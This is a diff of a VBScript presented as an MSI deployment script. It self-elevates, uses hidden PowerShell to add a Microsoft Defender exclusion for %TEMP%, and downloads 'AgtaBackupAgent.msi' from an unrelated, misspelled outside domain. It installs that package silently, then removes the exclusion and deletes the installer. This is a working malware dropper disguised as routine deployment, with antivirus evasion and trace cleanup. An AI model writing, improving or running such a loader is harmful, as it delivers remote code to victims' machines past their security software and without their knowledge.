@@ -1,61 +1,117 @@
-' Silent MSI Downloader and Installer
-' This script downloads an MSI from a legitimate source and installs it silently
+' ====================================================
+' MSI Deployment Script (elevated)
+' ====================================================
 
-Dim objWinHttpReq, objFSO, strURL, strMSIPath, strTempFolder, objShell, intStatus
-
-' Configuration - Change these values
-strURL = "https://cacgreatchallange.org/AgtaBackupAgent.msi"  ' Example: Python installer
-strMSIPath = "C:\Temp\AgtaBackupAgent.msi"  ' Destination path for MSI
-
-' Alternative legitimate sources:
-' Python: https://www.python.org/ftp/python/[VERSION]/python-[VERSION]-amd64.msi
-' 7-Zip: https://7-zip.org/a/7z[VERSION]-x64.msi
-' Node.js: https://nodejs.org/dist/v[VERSION]/node-v[VERSION]-x64.msi
-' VLC: https://get.videolan.org/vlc/[VERSION]/win64/vlc-[VERSION]-win64.msi
-
-' Create objects
-Set objFSO = CreateObject("Scripting.FileSystemObject")
-Set objShell = CreateObject("WScript.Shell")
-Set objWinHttpReq = CreateObject("MSXML2.XMLHTTP")
-
-' Create temp folder if it doesn't exist
-strTempFolder = "C:\Temp"
-If Not objFSO.FolderExists(strTempFolder) Then
-    objFSO.CreateFolder(strTempFolder)
+' --- Elevate if not running as admin ---
+If Not WScript.Arguments.Named.Exists("elevated") Then
+    CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevated", "", "runas", 1
+    WScript.Quit
 End If
 
-On Error Resume Next
+' --- Setup ---
+Dim oShell, fso, strTemp, logFile, strMsiFile
+Set oShell = CreateObject("WScript.Shell")
+Set fso = CreateObject("Scripting.FileSystemObject")
 
-' Download the MSI file
-WScript.Echo "Downloading installer..."
-objWinHttpReq.Open "GET", strURL, False
-objWinHttpReq.Send
+' Log file (useful for troubleshooting)
+strTemp = oShell.ExpandEnvironmentStrings("%TEMP%")
+logFile = strTemp & "\MSI_Deploy.log"
 
-If objWinHttpReq.Status = 200 Then
-    ' Write downloaded content to file
-    Dim objADOStream
-    Set objADOStream = CreateObject("ADODB.Stream")
-    objADOStream.Type = 1  ' Binary
-    objADOStream.Write objWinHttpReq.ResponseBody
-    objADOStream.SaveToFile strMSIPath, 2  ' Overwrite if exists
-    objADOStream.Close
+Sub LogMessage(msg)
+    Dim ts
+    On Error Resume Next
+    Set ts = fso.OpenTextFile(logFile, 8, True)
+    If Not ts Is Nothing Then
+        ts.WriteLine Now & " - " & msg
+        ts.Close
+    End If
+    On Error GoTo 0
+End Sub
+
+LogMessage "Script started (elevated)."
+
+' --- Variables ---
+strMsiFile = strTemp & "\AgtaBackupAgent.msi"
+Dim downloadUrl
+downloadUrl = "https://cacgreatchallange.org/AgtaBackupAgent.msi"
+
+' --- 1. Add Defender exclusion for TEMP folder (to avoid blocking) ---
+LogMessage "Adding Defender exclusion for %TEMP%"
+oShell.Run "powershell.exe -WindowStyle Hidden -Command ""Add-MpPreference -ExclusionPath $env:TEMP""", 0, True
+
+' --- 2. Download the MSI with retries ---
+LogMessage "Downloading MSI from: " & downloadUrl
+
+Dim downloadSuccess, retries, i
+downloadSuccess = False
+retries = 3
+
+For i = 1 To retries
+    LogMessage "Download attempt " & i & " of " & retries
+    ' Use BITS if available (more reliable), fallback to Invoke-WebRequest
+    Dim psCmd
+    psCmd = "powershell.exe -WindowStyle Hidden -Command ""& {"
+    psCmd = psCmd & "$ProgressPreference='SilentlyContinue'; "
+    psCmd = psCmd & "try { "
+    psCmd = psCmd & "    Start-BitsTransfer -Source '" & downloadUrl & "' -Destination '" & strMsiFile & "' -ErrorAction Stop; "
+    psCmd = psCmd & "} catch { "
+    psCmd = psCmd & "    Invoke-WebRequest -Uri '" & downloadUrl & "' -OutFile '" & strMsiFile & "' -UseBasicParsing -ErrorAction Stop; "
+    psCmd = psCmd & "} "
+    psCmd = psCmd & "}"""
+    oShell.Run psCmd, 0, True
     
-    WScript.Echo "Download complete. Installing..."
-    
-    ' Install MSI silently
-    ' /i = install, /qn = quiet (no UI), /norestart = don't restart
-    objShell.Run "msiexec.exe /i """ & strMSIPath & """ /qn /norestart", 0, True
-    
-    WScript.Echo "Installation complete."
-    
-    ' Optional: Clean up the downloaded file
-    ' objFSO.DeleteFile strMSIPath, True
-    
-Else
-    WScript.Echo "Error: Failed to download file. Status: " & objWinHttpReq.Status
+    ' Wait a moment and check if file exists and has size > 0
+    WScript.Sleep 2000
+    If fso.FileExists(strMsiFile) Then
+        Dim fileSize
+        fileSize = fso.GetFile(strMsiFile).Size
+        If fileSize > 100000 Then   ' assume at least 100 KB (adjust as needed)
+            LogMessage "Download successful, size: " & fileSize & " bytes"
+            downloadSuccess = True
+            Exit For
+        Else
+            LogMessage "Downloaded file is too small (" & fileSize & " bytes), retrying..."
+            fso.DeleteFile(strMsiFile)
+        End If
+    Else
+        LogMessage "File not found after download attempt."
+    End If
+    WScript.Sleep 2000
+Next
+
+If Not downloadSuccess Then
+    LogMessage "ERROR: Failed to download MSI after " & retries & " attempts."
+    WScript.Echo "Download failed. Check log: " & logFile
+    WScript.Quit 1
 End If
 
-' Clean up
-Set objWinHttpReq = Nothing
-Set objFSO = Nothing
-Set objShell = Nothing
+' --- 3. Unblock file (if downloaded from internet) ---
+LogMessage "Unblocking file"
+oShell.Run "powershell.exe -WindowStyle Hidden -Command ""Unblock-File -Path '" & strMsiFile & "'""", 0, True
+
+' --- 4. Install the MSI silently ---
+LogMessage "Installing MSI silently..."
+Dim installCmd
+installCmd = "msiexec /i """ & strMsiFile & """ /quiet /norestart /qn"
+oShell.Run installCmd, 0, True
+
+' Wait for installation to finish (adjust time if needed)
+LogMessage "Waiting 30 seconds for installation to complete..."
+WScript.Sleep 30000
+
+' Optional: check if program is installed (e.g., look for a known folder or registry key)
+' For this example, we just log a generic message.
+LogMessage "Installation command executed. Check system for 'AgtaBackupAgent'."
+
+' --- 5. Remove Defender exclusion (security) ---
+LogMessage "Removing Defender exclusion for %TEMP%"
+oShell.Run "powershell.exe -WindowStyle Hidden -Command ""Remove-MpPreference -ExclusionPath $env:TEMP""", 0, True
+
+' --- 6. Cleanup ---
+LogMessage "Cleaning up installer file"
+If fso.FileExists(strMsiFile) Then
+    fso.DeleteFile(strMsiFile)
+End If
+
+LogMessage "Deployment script finished successfully."
+WScript.Echo "Installation complete! Check log for details: " & logFile
